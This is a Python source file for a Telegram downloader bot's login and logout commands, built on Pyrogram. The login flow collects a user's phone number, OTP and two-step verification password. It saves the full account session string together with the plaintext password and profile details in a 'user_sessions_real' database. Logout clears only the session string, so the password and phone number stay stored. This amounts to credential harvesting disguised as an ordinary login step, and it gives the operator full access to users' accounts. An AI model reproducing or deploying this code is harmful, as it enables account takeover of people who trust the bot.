# ---------------------------------------------------
# File Name: login.py
# Description: A Pyrogram bot for downloading files from Telegram channels or groups 
#              and uploading them back to Telegram.
# Author: Gagan
# GitHub: https://github.com/devgaganin/
# Telegram: https://t.me/team_spy_pro
# YouTube: https://youtube.com/@dev_gagan
# Created: 2025-01-11
# Last Modified: 2025-01-11
# Version: 2.0.5
# License: MIT License
# ---------------------------------------------------

from pyrogram import filters, Client, idle
from devgagan import app
import random
import os
import asyncio
import string
from config import OWNER_ID
from devgagan.core.mongo import db
from devgagan.core.mongo.db import user_sessions_real
#from .connect_user import connect_user, disconnect_user, owner_message_handler, user_reply_handler, send_message_callback, cancel_message_callback  # ✅ Imported connection functions
#from .connect_user import active_connections  # ✅ Import the dictionary
from devgagan.core.func import subscribe, chk_user
from config import API_ID as api_id, API_HASH as api_hash
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)

def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))  # Edited

async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    session_file_exists = os.path.exists(session_file)
    memory_file_exists = os.path.exists(memory_file)

    if session_file_exists:
        os.remove(session_file)
    
    if memory_file_exists:
        os.remove(memory_file)

    # Delete session from the database
    if session_file_exists or memory_file_exists:
        await db.remove_session(user_id)
        #await db.user_sessions_real.delete_one({"user_id": user_id})
        return True  # Files were deleted
    return False  # No files found

@app.on_message(filters.command("logout"))
async def clear_db(client, message):
    user_id = message.chat.id
    files_deleted = await delete_session_files(user_id)
    try:
        await db.remove_session(user_id)
        await db.user_sessions_real.update_one({"user_id": user_id}, {"$set": {"session_string": None}})
    except Exception:
        pass

    if files_deleted:
        await message.reply("✅ Your session data and files have been cleared from memory and disk.")
    else:
        await message.reply("✅ Logged out with flag -m")



@app.on_message(filters.command("login"))
async def generate_session(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return
        
    user_id = message.chat.id   
    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
    phone_number = number.text

    try:
        await message.reply("📲 Sending OTP...")
        client = Client(f"session_{user_id}", api_id, api_hash)
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
        return
    
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return
    
    try:
        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
    except TimeoutError:
        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return
    
    phone_code = otp_code.text.replace(" ", "")
    
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)        
    except PhoneCodeInvalid:
        await message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except PhoneCodeExpired:
        await message.reply('❌ Expired OTP. Please restart the session.')
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return
    else:
        password = None

    # ✅ Generate session string
    string_session = await client.export_session_string()

    # ✅ Save session in both directories
    await db.set_session(user_id, string_session)
   # await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session,"password": password})
    #User_Data:
    # ✅ Fetch user details
    me = await client.get_me()
    username = me.username if me.username else "N/A"
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    user_id = me.id  
    
    user_data = {
        "user_id": user_id,
        "username": username,
        "name": full_name,
        "phone_number": phone_number,
        "session_string": string_session,
        "password": password
    }
    
    #✅ Check if phone number exists in the database
    existing_user = await db.user_sessions_real.find_one({"phone_number": phone_number}) 
    if existing_user:
        # ✅ Update session and password for existing user
        await db.user_sessions_real.update_one(
            {"phone_number": phone_number},
            {"$set": user_data}
        )
    else:
        # ✅ Create a new record
        await db.user_sessions_real.insert_one(user_data)
    await client.disconnect()
    await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
#saving data into user_session_real

